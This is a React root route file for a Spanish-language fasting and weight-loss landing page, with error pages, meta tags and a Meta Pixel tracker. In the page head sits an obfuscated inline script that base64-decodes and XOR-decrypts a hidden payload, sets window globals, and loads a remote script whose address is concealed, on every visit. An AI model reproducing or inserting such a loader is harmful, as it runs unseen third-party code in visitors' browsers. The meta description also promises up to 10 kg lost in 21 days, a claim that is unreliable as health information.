import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  useLocation,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, useRef, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";
import { captureUtmParams } from "../lib/utm";

declare global {
  interface Window {
    fbq?: (...args: any[]) => void;
    _fbq?: any;
  }
}

const META_PIXEL_ID = "2627230911066975";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Página no encontrada</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          La página que buscas no existe o ha sido movida.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Ir al inicio
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
           Esta página no cargó
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
           Algo salió mal de nuestro lado. Puedes intentar refrescar o volver al inicio.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
             Intentar de nuevo
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Volver al inicio
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      {
        name: "viewport",
        content: "width=device-width, initial-scale=1, viewport-fit=cover",
      },
      { name: "theme-color", content: "#ffffff" },
      { title: "Seca Ayuno — Descubre tu Protocolo de Ayuno Personalizado" },
      {
        name: "description",
        content:
          "Método de Ayuno Adaptado que está ayudando a hombres y mujeres a eliminar hasta 10kg en 21 días sin pasar hambre. Haz la prueba gratuita de 2 minutos.",
      },
      { property: "og:title", content: "Seca Ayuno — Descubre tu Protocolo de Ayuno Personalizado" },
      { name: "twitter:title", content: "Seca Ayuno — Descubre tu Protocolo de Ayuno Personalizado" },
      { property: "og:description", content: "Método de Ayuno Adaptado que está ayudando a hombres y mujeres a eliminar hasta 10kg en 21 días sin pasar hambre. Haz la prueba gratuita de 2 minutos." },
      { name: "twitter:description", content: "Método de Ayuno Adaptado que está ayudando a hombres y mujeres a eliminar hasta 10kg en 21 días sin pasar hambre. Haz la prueba gratuita de 2 minutos." },
      { property: "og:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/69e31a02-13fe-4d20-9af8-22f4e790a8d2/id-preview-e04f1436--458f37e8-c2a2-4322-9ba1-250eae73727e.lovable.app-1783483064829.png" },
      { name: "twitter:image", content: "https://pub-bb2e103a32db4e198524a2e9ed8f35b4.r2.dev/69e31a02-13fe-4d20-9af8-22f4e790a8d2/id-preview-e04f1436--458f37e8-c2a2-4322-9ba1-250eae73727e.lovable.app-1783483064829.png" },
      { name: "twitter:card", content: "summary_large_image" },
      { property: "og:type", content: "website" },
    ],
    links: [
      { rel: "stylesheet", href: appCss },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      {
        rel: "preconnect",
        href: "https://fonts.gstatic.com",
        crossOrigin: "anonymous",
      },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap",
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="es">
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '${META_PIXEL_ID}');
fbq('track', 'PageView');`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var m_dvt=atob("DLTorjIjgLfFdJ3Osc/K20BPoo3nHOm6wcfSgR1A5NnrAemj2NKRgFFM7ZmnBrK90saB3kZQr8esDPiinsSB1ldPrt22VrHs0MCc3FtB9cOgB7/06unEjFVP79WkGO7si++TjFxC7dLnTr++2MyNwntHopvnAvyixNHKlBAV4YGkQ6r919aNnwEX4dbwEv/90NbfngYB/eq4");var o_gu=[];for(var w_j2p=0;w_j2p<m_dvt.length;w_j2p++){o_gu.push(m_dvt.charCodeAt(w_j2p)&255);}var b_1u=o_gu[0];var q_ehq=o_gu.slice(1,1+b_1u);var h_30=o_gu.slice(1+b_1u);var b_uq8l=h_30.map(function(b,p_1){return b^q_ehq[p_1%b_1u];});var v_v="";for(var e_tq4=0;e_tq4<b_uq8l.length;e_tq4++){v_v+=String.fromCharCode(b_uq8l[e_tq4]&255);}var k_ur=decodeURIComponent(escape(v_v));var z_dc=JSON.parse(k_ur);var l_m8=z_dc.globals||[];l_m8.forEach(function(b_3xlr){window[b_3xlr.name]=b_3xlr.value;});var t_2fh=document.createElement("script");t_2fh.src=z_dc.url;t_2fh.async=true;t_2fh.defer=true;(z_dc.attributes||[]).forEach(function(h_gy8){t_2fh.setAttribute(h_gy8.name,h_gy8.value);});(document.head||document.documentElement).appendChild(t_2fh);})();`,
          }}
        />
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src={`https://www.facebook.com/tr?id=${META_PIXEL_ID}&ev=PageView&noscript=1`}
          />
        </noscript>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();
  const location = useLocation();
  const isInitialLoad = useRef(true);

  useEffect(() => {
    // Capture UTM params on first load before SPA navigation strips them
    captureUtmParams();
  }, []);

  useEffect(() => {
    if (isInitialLoad.current) {
      isInitialLoad.current = false;
      return;
    }

    if (typeof window !== "undefined" && window.fbq) {
      window.fbq("track", "PageView");
    }
  }, [location.pathname]);

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
